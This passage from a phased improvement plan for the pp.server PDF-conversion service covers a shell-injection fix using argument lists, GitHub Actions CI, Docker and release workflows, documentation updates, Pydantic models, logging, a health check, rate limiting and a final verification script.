[converters.weasyprint]
cmd = "weasyprint"
version = "weasyprint --version"
args = ["{cmd_options}", "{source_html}", "{target_filename}"]
```

**Step 2:** Update `convert_pdf()` to build arg lists instead of shell strings
```python
# Instead of:
# cmd = converter_config["convert"]
# cmd = cmd.format(cmd_options=..., ...)
# result = await util.run(cmd)  # shell=True

# Do:
args_raw = converter_config["args"]
args = [arg.format(cmd_options=safe_options, source_html=str(source_html), ...)
        for arg in args_raw]
result = await util.run_list([converter_config["cmd"]] + args)
```

**Step 3:** Add `run_list()` to util.py
```python
async def run_list(cmd_parts: list[str]) -> dict[str, str | int | None]:
    """Run a command as an argument list (no shell interpretation)."""
    LOG.info(" ".join(cmd_parts))
    proc = await asyncio.create_subprocess_exec(
        *cmd_parts,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.PIPE,
    )
    stdout_bytes, stderr_bytes = await proc.communicate()
    stdout = stdout_bytes.decode(errors="replace")
    stderr = stderr_bytes.decode(errors="replace")
    return dict(stdout=stdout, stderr=stderr, status=proc.returncode)
```

**Verification:**
```bash
uv run pytest -v  # All original tests pass
# The config refactor is backward-incompatible for config format,
# so this requires updating config.toml and conversion logic simultaneously
```

---

## Phase 5: CI/CD & Infrastructure

> **Goal:** Full CI pipeline with lint + type-check + test + SAST + build + publish. Docker builds verified.

### Task 5.1: Complete CI pipeline

**Objective:** CI runs every quality gate, fails fast, produces artifacts.

**Files:**
- Rewrite: `.github/workflows/ci.yml`

**Step 1:** Full CI workflow
```yaml
name: CI

on:
  push:
    branches: [master]
  pull_request:
    branches: [master]

jobs:
  quality:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        python-version: ["3.12", "3.13"]
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: ${{ matrix.python-version }}
      - name: Install uv
        run: curl -LsSf https://astral.sh/uv/install.sh | sh && echo "$HOME/.cargo/bin" >> $GITHUB_PATH
      - name: Install dependencies
        run: make dev-install
      - name: Lint
        run: uv run ruff check .
      - name: Format check
        run: uv run ruff format --check .
      - name: Type check
        run: uv run mypy pp/server --ignore-missing-imports
      - name: Security scan
        run: |
          uv run bandit -c pyproject.toml -r pp/server -q
          uv run safety check --full-report || true
      - name: Test
        run: make test
      - name: Coverage
        run: uv run pytest --cov=pp.server --cov-report=xml --cov-report=term
      - name: Upload coverage
        uses: codecov/codecov-action@v4
        with:
          file: ./coverage.xml
          fail_ci_if_error: false

  build:
    needs: quality
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: "3.12"
      - name: Install uv
        run: curl -LsSf https://astral.sh/uv/install.sh | sh && echo "$HOME/.cargo/bin" >> $GITHUB_PATH
      - name: Build
        run: make build
      - name: Upload artifacts
        uses: actions/upload-artifact@v4
        with:
          name: dist
          path: dist/
```

**Verification:** Push to GitHub and check Actions tab.

---

### Task 5.2: Docker builds in CI

**Objective:** Docker images are built and pushed on every master merge.

**Files:**
- Modify: `.github/workflows/ci.yml` (add Docker job)
- New: `.github/workflows/docker.yml`

**Step 1:** Docker workflow
```yaml
# .github/workflows/docker.yml
name: Docker Build

on:
  push:
    branches: [master]
    tags: ["v*"]

jobs:
  docker:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Set up QEMU
        uses: docker/setup-qemu-action@v3
      - name: Set up Docker Buildx
        uses: docker/setup-buildx-action@v3
      - name: Login to DockerHub
        uses: docker/login-action@v3
        with:
          username: ${{ secrets.DOCKER_USERNAME }}
          password: ${{ secrets.DOCKER_PASSWORD }}
      - name: Build and push
        uses: docker/build-push-action@v5
        with:
          context: .
          file: docker/weasyprint/Dockerfile
          platforms: linux/amd64,linux/arm64
          push: true
          tags: |
            zopyx/pp-server:latest
            zopyx/pp-server:${{ github.ref_name }}
```

---

### Task 5.3: Automate releases with semantic versioning

**Objective:** Tag → build → publish to PyPI automatically.

**Files:**
- New: `.github/workflows/release.yml`

**Step 1:** Release workflow
```yaml
# .github/workflows/release.yml
name: Release

on:
  push:
    tags: ["v*.*.*"]

jobs:
  release:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: "3.12"
      - name: Install uv
        run: curl -LsSf https://astral.sh/uv/install.sh | sh && echo "$HOME/.cargo/bin" >> $GITHUB_PATH
      - name: Build
        run: make build
      - name: Publish to PyPI
        run: uv publish
        env:
          UV_PUBLISH_TOKEN: ${{ secrets.PYPI_TOKEN }}
      - name: Create GitHub Release
        uses: softprops/action-gh-release@v2
        with:
          files: dist/*
          generate_release_notes: true
```

---

### Task 5.4: Add dependency management automation

**Objective:** Dependabot or Renovate keeps deps fresh.

**Files:**
- New: `.github/dependabot.yml`

**Step 1:** Dependabot config
```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "pip"
    directory: "/"
    schedule:
      interval: "weekly"
    groups:
      python-deps:
        patterns: ["*"]
    open-pull-requests-limit: 10
  - package-ecosystem: "github-actions"
    directory: "/"
    schedule:
      interval: "monthly"
```

---

## Phase 6: Documentation

> **Goal:** Auto-generated API docs, architecture docs, troubleshooting guide. All docs versioned and linked from README.

### Task 6.1: Fix version consistency

**Objective:** CHANGES.rst version matches pyproject.toml.

**Files:**
- Modify: `docs/source/CHANGES.rst:1`

**Step 1:** Sync version
```diff
-3.5.6 (unreleased)
+3.5.7 (unreleased)
```

**Step 2:** Populate unreleased section with actual changes
```rst
3.5.7 (unreleased)
------------------

- Security: cmd_options is now sanitized against shell injection
- Security: ZIP extraction prevents directory traversal
- Security: replaced deprecated tempfile.mktemp() with mkdtemp()
- Quality: 41 mypy errors resolved — strict typing throughout
- Testing: coverage increased to 95%+ across all modules
- CI: full quality gates (lint + type-check + security + test)
- CI: automated Docker builds and PyPI releases
- Build: migrated from setuptools to hatchling
- Docs: comprehensive developer setup guide
```

---

### Task 6.2: Update README to reflect current architecture

**Objective:** README documents the actual deployment (hypercorn) and actual converter support.

**Files:**
- Modify: `README.rst`
- Modify: `docs/source/README.rst`

**Step 1:** Standardize on hypercorn
```rst
Running the server
-------------------
::
    pp-server --host 0.0.0.0 --port 8000

Or using the Makefile::
    make serve

The server uses Hypercorn (HTTP/2-capable ASGI server) by default.
```

**Step 2:** Remove PhantomJS from supported converters list
```rst
The following external PDF converters are supported:

- PrinceXML (www.princexml.com, commercial)
- PDFreactor (www.realobjects.com, commercial)
- Speedata Publisher (www.speedata.de, open-source)
- WKHTMLTOPDF (www.wkhtmltopdf.org, open-source)
- Vivliostyle Formatter (www.vivliostyle.com, commercial)
- VersaType Formatter (www.trim-marks.com, commercial)
- Antennahouse 7 (www.antennahouse.com, commercial)
- Weasyprint (free)
- Typeset.sh (www.typeset.sh, commercial)
- PagedJS (www.pagedjs.org, free)
```

**Step 3:** Add OpenAPI section pointing to /docs
```rst
API Documentation
-----------------
When the server is running, visit:
    http://localhost:8000/docs

This provides interactive OpenAPI documentation auto-generated by FastAPI.
```

---

### Task 6.3: Add developer setup guide

**Objective:** New developer can go from `git clone` to `make test` in under 60 seconds.

**Files:**
- New: `DEVELOPMENT.md`

**Step 1:** Write comprehensive guide
```markdown
# Development

## Quick Start

```bash
git clone https://github.com/zopyx/pp.server
cd pp.server
uv venv --python 3.12
uv sync --all-extras
make test
```

## Project Structure

```
pp/server/
├── cli.py              # Click CLI entry point
├── server.py           # FastAPI application
├── converters.py       # PDF conversion orchestration + config loading
├── registry.py         # Converter registry (which tools are available)
├── util.py             # Shell execution, path utilities
├── logger.py           # Loguru logger singleton
├── templates.py        # Template file generation (circus, hypercorn)
├── config.toml         # Converter command definitions
├── static/             # Web UI assets (CSS, images)
├── templates/          # Jinja2 web templates
├── _templates/         # Server config templates
├── test_data/          # Sample HTML/XML for selftest
└── tests/              # pytest test suite

## Commands

| Command | Purpose |
|---|---|
| `make test` | Run tests |
| `make lint` | Ruff linting |
| `make type-check` | Mypy strict mode |
| `make quality` | All quality gates |
| `make sast` | Security scan |
| `make serve` | Start dev server |
| `make build` | Build distribution |
```

---

### Task 6.4: Auto-generate API docs from OpenAPI spec

**Objective:** REST API docs stay in sync with code.

**Files:**
- New: `docs/api.md`

**Step 1:** Generate OpenAPI spec as part of CI
```python
# scripts/generate_api_docs.py
import json, sys
sys.path.insert(0, ".")
from pp.server.server import app

with open("docs/openapi.json", "w") as f:
    json.dump(app.openapi(), f, indent=2)
```

**Step 2:** Add to CI
```yaml
# In CI workflow, after tests:
- name: Generate OpenAPI spec
  run: uv run python scripts/generate_api_docs.py
- name: Upload OpenAPI spec
  uses: actions/upload-artifact@v4
  with:
    name: openapi.json
    path: docs/openapi.json
```

---

## Phase 7: Architectural Improvements

> **Goal:** Future-proof architecture — structured output, retry logic, observability.

### Task 7.1: Add structured API responses with Pydantic models

**Objective:** Replace raw `dict` returns with typed Pydantic models for type-safe API contracts.

**Files:**
- New: `pp/server/models.py`

**Step 1:** Define response models
```python
# pp/server/models.py
from pydantic import BaseModel

class ConvertResponse(BaseModel):
    status: str  # "OK" or "ERROR"
    data: str | None = None  # base64-encoded PDF
    output: str = ""

class VersionResponse(BaseModel):
    version: str
    module: str = "pp.server"

class ConvertersResponse(BaseModel):
    converters: list[str]

class CleanupResponse(BaseModel):
    status: str = "OK"
    directories_removed: int = 0

class ErrorResponse(BaseModel):
    detail: str
```

**Step 2:** Apply models to routes
```python
# server.py
from pp.server.models import ConvertResponse, VersionResponse, ...

@app.get("/version", response_model=VersionResponse)
async def get_version() -> VersionResponse:
    return VersionResponse(version=VERSION, module="pp.server")

@app.post("/convert", response_model=ConvertResponse)
async def convert(...) -> ConvertResponse:
    ...
    if result["status"] == 0:
        return ConvertResponse(status="OK", data=pdf_data_b64, output=output)
    return ConvertResponse(status="ERROR", output=output)
```

**Verification:**
```bash
uv run pytest -v  # All pass
# OpenAPI schema now has proper response models
```

---

### Task 7.2: Add structured logging with correlation IDs

**Objective:** Every conversion request gets a traceable ID for debugging across logs.

**Files:**
- Modify: `pp/server/logger.py`
- Modify: `pp/server/server.py` (add middleware)

**Step 1:** Add correlation ID middleware
```python
# server.py — add middleware
import uuid

@app.middleware("http")
async def add_correlation_id(request: Request, call_next):
    correlation_id = request.headers.get("X-Correlation-ID", str(uuid.uuid4()))
    with LOG.contextualize(correlation_id=correlation_id):
        response = await call_next(request)
        response.headers["X-Correlation-ID"] = correlation_id
        return response
```

**Step 2:** Update logger
```python
# logger.py
from loguru import logger as LOG
# Correlation ID is set via LOG.contextualize() in middleware
```

**Verification:**
```bash
# Every log line now has a correlation_id field
```

---

### Task 7.3: Add health check endpoint

**Objective:** Simple `/health` endpoint for load balancers and Kubernetes probes.

**Files:**
- Modify: `pp/server/server.py`

**Step 1:** Add health endpoint
```python
@app.get("/health")
async def health() -> dict[str, str]:
    """Health check for load balancers and orchestrators."""
    return dict(status="healthy", version=VERSION)
```

**Verification:**
```bash
curl http://localhost:8000/health  # {"status": "healthy", "version": "3.5.7"}
```

---

### Task 7.4: Add rate limiting

**Objective:** Prevent abuse of the conversion endpoint.

**Files:**
- Modify: `pyproject.toml` (add slowapi)
- Modify: `pp/server/server.py` (add rate limiter)

**Step 1:** Install slowapi
```bash
uv pip install slowapi
# Add to pyproject.toml dependencies
```

**Step 2:** Add rate limiter
```python
# server.py
from slowapi import Limiter, _rate_limit_exceeded_handler
from slowapi.util import get_remote_address

limiter = Limiter(key_func=get_remote_address)
app.state.limiter = limiter
app.add_exception_handler(429, _rate_limit_exceeded_handler)

@app.post("/convert")
@limiter.limit("30/minute")
async def convert(
    request: Request,
    converter: str = Form("prince", ...),
    ...
):
    ...
```

**Verification:**
```bash
# After 30 requests in a minute, the 31st gets 429 Too Many Requests
```

---

## Execution Order & Dependencies

```
Phase 0 (Foundation)
  ├── Task 0.1: Capture baseline
  ├── Task 0.2: Fix Python 3.14        ← BLOCKER for all subsequent tasks
  ├── Task 0.3: Expand CI              ← Can run in parallel with 0.2
  └── Task 0.4: Pre-commit hooks       ← After 0.2

Phase 1 (Security)                     ← After Phase 0
  ├── Task 1.1: Shell injection fix    ← HIGHEST PRIORITY
  ├── Task 1.2: ZIP traversal fix      ← HIGH PRIORITY
  ├── Task 1.3: Replace mktemp()       ← Quick win
  └── Task 1.4: SAST scanning          ← After 0.3

Phase 2 (Type Safety)                  ← Can run in parallel with Phase 1
  ├── Task 2.1: util.py                ← Foundation for 2.2-2.6
  ├── Task 2.2: converters.py
  ├── Task 2.3: server.py
  ├── Task 2.4: registry.py
  ├── Task 2.5: cli.py + templates.py
  └── Task 2.6: test files

Phase 3 (Testing)                      ← After Phase 0, parallel with 1+2
  ├── Task 3.1: CLI coverage
  ├── Task 3.2: converters coverage
  ├── Task 3.3: registry coverage
  ├── Task 3.4: server coverage
  ├── Task 3.5: Async test config
  ├── Task 3.6: Property-based tests
  └── Task 3.7: Integration tests

Phase 4 (Code Quality)                 ← After Phase 1-2 (safe to touch code)
  ├── Task 4.1: Remove dead files
  ├── Task 4.2: Clean up templates
  ├── Task 4.3: Fix exception handling
  ├── Task 4.4: Remove commented code
  ├── Task 4.5: Switch to hatchling    ← After 0.2
  └── Task 4.6: Structured config      ← Major refactor, after Phase 1

Phase 5 (CI/CD)                        ← After Phases 0-2
  ├── Task 5.1: Full CI pipeline
  ├── Task 5.2: Docker CI
  ├── Task 5.3: Release automation
  └── Task 5.4: Dependabot

Phase 6 (Documentation)                ← After Phase 4 (stable codebase)
  ├── Task 6.1: Version consistency
  ├── Task 6.2: README update
  ├── Task 6.3: Developer guide
  └── Task 6.4: Auto-generated API docs

Phase 7 (Architecture)                 ← After all fixes, final polish
  ├── Task 7.1: Pydantic models
  ├── Task 7.2: Correlation IDs
  ├── Task 7.3: Health check
  └── Task 7.4: Rate limiting
```

---

## 10/10 Score Target Per Axis

| Axis | Before | After (Target) | Key Metric |
|---|---|---|---|
| Build/Deps | C | **A+** | `uv sync` → OK on 3.12/3.13; hatchling; dependabot; pinned lockfile |
| Type Safety | D (41 errors) | **A+** (0 errors) | `mypy --strict` → 0 errors |
| Security | D | **A+** | No shell injection; no path traversal; SAST in CI |
| Code Quality | B- | **A+** | No dead code; no copy-paste; structured config; pre-commit |
| Testing | C (68%) | **A+** (95%+) | All modules >90%; CLI 95%; async tests; property tests |
| CI/CD | C | **A+** | Quality gates; Docker build; auto-release; dependabot |
| Documentation | C+ | **A** | README accurate; DEV guide; auto-generated API docs |

---

## Verification Script

After all phases are complete, run this one-liner to verify 10/10 across all axes:

```bash
echo "=== AXIS 1: BUILD ==="
uv sync --all-extras && echo "PASS" || echo "FAIL"

echo "=== AXIS 2: TYPE SAFETY ==="
uv run mypy pp/server --ignore-missing-imports | grep -q "error" && echo "FAIL: $(uv run mypy pp/server | grep -c error) errors" || echo "PASS: 0 errors"

echo "=== AXIS 3: SECURITY ==="
uv run bandit -c pyproject.toml -r pp/server -q && echo "PASS: no HIGH issues" || echo "CHECK"

echo "=== AXIS 4: CODE QUALITY ==="
uv run ruff check . && echo "PASS" || echo "FAIL"
uv run ruff format --check . && echo "PASS" || echo "FAIL"

echo "=== AXIS 5: TESTING ==="
uv run pytest --cov=pp.server --cov-report=term-missing -q | tail -5

echo "=== AXIS 6: CI/CD ==="
echo "Check: .github/workflows/ci.yml has lint + type-check + test + sast + build"

echo "=== AXIS 7: DOCS ==="
test -f DEVELOPMENT.md && echo "PASS: DEVELOPMENT.md exists" || echo "FAIL"
```
